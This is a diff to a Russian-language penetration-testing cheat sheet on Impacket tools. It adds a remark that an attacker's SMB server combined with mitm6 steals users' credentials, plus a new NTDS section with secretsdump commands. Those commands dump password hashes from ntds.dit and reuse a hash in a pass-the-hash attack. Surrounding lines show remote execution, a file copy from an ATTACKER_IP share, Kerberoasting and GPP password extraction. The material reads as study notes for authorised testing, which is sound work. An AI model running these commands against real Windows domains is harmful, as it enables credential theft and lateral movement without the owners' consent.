@@ -16,7 +16,7 @@ impacket-psexec - `impacket-psexec '{domain}/{username}:{pass}@{IP}'
 impacket-wmiexec
 impacket-smbexec
 ## SMB
-### Передать файл через SMB
+### Передать файл через SMB (развернуть SMB сервер)
 ```
 impacket-smbserver -smb2support public mydir
 ```
@@ -28,6 +28,10 @@ impacket-smbserver -smb2support public mydir
 ``` 
 copy \\<ATTACKER_IP>\public\{myfile.txt}
 ```
+
+этот же сервер можно использовать совместно с [[mitm6]], чтобы красть аутентификационные данные пользователей.
+
+---
 ## mySQL
 ```
 cd impacket/examples/
@@ -77,3 +81,20 @@ impacket-GetUserSPNs {domain}/{username}:{pass} -dc-ip {IP}
 ```
 impacket-Get-GPPPassword {domain}/{username}:{pass}@{IP}
 ```
+
+# NTDS
+### Анализ 
+``` 
+secretsdump.py -ntds /путь/к/файлу/ntds.dit -system /путь/к/файлу/SYSTEM LOCAL
+```
+`LOCAL` - указывает дампить локально. Также можно дампить и удалённо, имя аутентификационные данные.
+
+Вывод:
+```
+{userName}:{userID}:{LM HASH от пустого пароля(у всех одинаковый)}:{NTLM HASH}:::
+```
+### Атака
+```
+secretsdump.py -hashes :{HASH} '{domain/{userName}@{IP}'
+```
+Машинные учётные записи именуются в виде `{имя компьютера}$`
